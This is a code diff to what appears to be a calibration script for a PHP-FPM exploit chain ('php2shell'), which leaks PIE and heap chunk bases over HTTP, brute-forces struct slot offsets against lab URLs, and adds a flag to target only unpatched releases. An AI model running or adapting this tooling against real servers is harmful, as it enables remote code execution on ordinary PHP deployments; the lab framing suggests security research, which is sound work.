@@ -20,7 +20,6 @@ from __future__ import annotations
 
 import argparse
 import contextlib
-import json
 import os
 import struct
 import sys
@@ -130,7 +129,6 @@ def collect_slots(base: str, builder: str, version: str, oracle: fpm.Oracle,
                   pads: list[int], size: int, rounds: int = 6):
     """Collect the (chunk offset, content offset) pairs of the struct slot."""
     chain404 = fpm.Target(base + fpm.PATHS["probe"])
-    chainapp = fpm.Target(base + fpm.PATHS["app"])
     slots: list[tuple[int, int]] = []
     for _ in range(rounds):
         try:
@@ -553,7 +551,7 @@ def calibrate(version: str, base: str, builder: str, update: bool,
             pie, chunk = fpm.leak_bases_http(base, builder, version)
         except (OSError, RuntimeError) as exc:
             log(f"    HTTP leak failed: {exc}")
-            pie, chunk = oracle.pie_base, chunk
+            chunk = oracle.chunk_base(oracle.unserialize_data()) or chunk
         no_oracle_candidates = brute_force_candidates(
             base, builder, version, chunk, offsets, pads=pads,
             size=no_oracle_size)
@@ -593,6 +591,8 @@ def main() -> int:
     parser.add_argument("--version", default=None)
     parser.add_argument("--all", action="store_true",
                         help="calibrate every built version")
+    parser.add_argument("--vulnerable-only", action="store_true",
+                        help="with --all: skip the releases that carry the fix")
     parser.add_argument("--base", default=None)
     parser.add_argument("--builder", default=None)
     parser.add_argument("--update", action="store_true",
@@ -605,6 +605,10 @@ def main() -> int:
 
     if args.all:
         versions = profile_gen.built_versions()
+        if args.vulnerable_only:
+            import php2shell_fpm_versions as versions_registry
+            versions = [v for v in versions
+                        if versions_registry.is_vulnerable(v)]
         failures = []
         for version in versions:
             base, builder = lab_urls(version)
